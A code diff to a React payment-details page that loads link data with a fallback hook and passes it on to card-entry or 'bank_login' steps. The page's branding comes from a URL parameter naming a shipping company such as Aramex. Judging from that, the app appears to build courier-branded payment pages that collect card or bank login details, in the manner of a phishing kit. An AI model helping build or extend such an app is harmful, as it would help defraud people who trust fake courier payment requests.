@@ -3,7 +3,7 @@ import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { shippingCompanyBranding } from "@/lib/brandingSystem";
-import { useLink } from "@/hooks/useSupabase";
+import { useLinkWithFallback, appendDataParam } from "@/hooks/useLinkWithFallback";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
 import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, ShieldCheck, Lock, Sparkles, CheckCircle2 } from "lucide-react";
@@ -16,7 +16,7 @@ import PageLoader from "@/components/PageLoader";
 const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const { data: linkData, isLoading } = useLink(id);
+  const { data: linkData, isLoading } = useLinkWithFallback(id);
 
   const urlParams = new URLSearchParams(window.location.search);
   const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
@@ -61,10 +61,11 @@ const PaymentDetails = () => {
   const handleProceed = () => {
     const paymentMethod = methodParam || (linkData?.payload as any)?.payment_method || 'card';
     
-    const nextUrl = paymentMethod === 'bank_login' 
+    const baseUrl = paymentMethod === 'bank_login' 
       ? `/pay/${id}/bank-selector?company=${serviceKey}&currency=${currencyParam || countryCode}&amount=${amount}`
       : `/pay/${id}/card-input?company=${serviceKey}&currency=${currencyParam || countryCode}&amount=${amount}`;
     
+    const nextUrl = appendDataParam(baseUrl, linkData);
     navigate(nextUrl);
   };
   
